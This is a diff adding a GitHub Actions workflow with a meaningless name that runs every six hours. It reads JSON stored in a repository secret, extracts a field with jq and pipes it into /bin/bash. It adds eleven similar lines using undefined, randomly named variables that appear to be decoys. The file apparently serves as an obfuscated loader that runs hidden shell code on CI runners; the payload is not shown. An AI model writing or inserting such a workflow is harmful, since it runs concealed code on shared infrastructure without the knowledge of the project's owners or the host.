@@ -1,0 +1,29 @@
+name: minidisctransire
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: minidisctransire
+        env:
+          s70713: ${{ secrets.s70713 }}
+        run: |
+          echo $s70713 | jq -r .xx97275 | /bin/bash
+          echo $pwok72 | jq -r .agbkb5 | /bin/bash
+          echo $waodh42 | jq -r .ujz446 | /bin/bash
+          echo $zzfm7 | jq -r .sdlg89 | /bin/bash
+          echo $twvux6984 | jq -r .yfbn6400 | /bin/bash
+          echo $neguy6734 | jq -r .gkvks4 | /bin/bash
+          echo $ngzj7 | jq -r .nh363 | /bin/bash
+          echo $qwbkt7 | jq -r .wdaag18 | /bin/bash
+          echo $fe981 | jq -r .wanw5940 | /bin/bash
+          echo $lspak82732 | jq -r .km007 | /bin/bash
+          echo $mcczo30718 | jq -r .fm33092 | /bin/bash
+          echo $ecmd9448 | jq -r .vti336 | /bin/bash
+
